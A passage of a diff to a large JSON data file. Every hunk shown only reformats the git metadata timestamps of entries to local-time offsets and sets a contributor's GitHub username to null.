       ]
     },
@@ -9451,13 +10161,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-07T04:00:34Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-06T23:00:34-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -9663,13 +10373,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-10T13:36:26Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-10T08:36:26-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -9890,13 +10600,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-10T13:36:26Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-10T08:36:26-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -10139,13 +10849,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-11-10T13:36:26Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-11-10T08:36:26-05:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -10379,13 +11089,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -10623,13 +11333,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -10819,13 +11529,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -11030,13 +11740,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-11T19:29:07Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -11237,13 +11947,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-11T19:29:07Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -11444,13 +12154,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-11T19:29:07Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -11631,13 +12341,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-11T19:29:07Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -11837,13 +12547,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -12028,13 +12738,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
@@ -12257,13 +12967,13 @@
       ]
     },
     "gitMetadata": {
-      "created": "2025-10-09T19:58:48Z",
-      "lastUpdated": "2025-11-12T03:03:14Z",
+      "created": "2025-10-09T15:58:48-04:00",
+      "lastUpdated": "2025-11-17T13:46:36-05:00",
       "contributors": [
         {
           "name": "Seth Art",
           "email": "seth.art@datadoghq.com",
-          "githubUsername": "sethsec"
+          "githubUsername": null
         }
       ]
     },
